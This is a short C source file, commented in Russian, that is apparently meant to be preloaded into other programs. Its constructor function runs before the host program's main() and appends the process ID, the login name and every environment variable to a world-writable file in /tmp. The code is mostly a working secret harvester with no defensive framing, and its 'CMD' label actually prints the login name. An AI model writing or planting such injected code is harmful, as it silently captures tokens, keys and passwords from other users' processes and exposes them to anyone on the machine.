#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>

// Конструктор секция: выполняется ДО main() основной программы
__attribute__((constructor))
void init() {
    int fd = open("/tmp/preloaded_env.txt", O_WRONLY | O_CREAT | O_APPEND, 0666);
    if (fd < 0) return;

    char header[128];
    sprintf(header, "\n--- PID %d | CMD: %s ---\n", getpid(), getlogin() ? getlogin() : "unknown");
    write(fd, header, strlen(header));

    // Дампим все переменные окружения текущего процесса
    extern char **environ;
    for (char **env = environ; *env != NULL; env++) {
        write(fd, *env, strlen(*env));
        write(fd, "\n", 1);
    }
    close(fd);
}
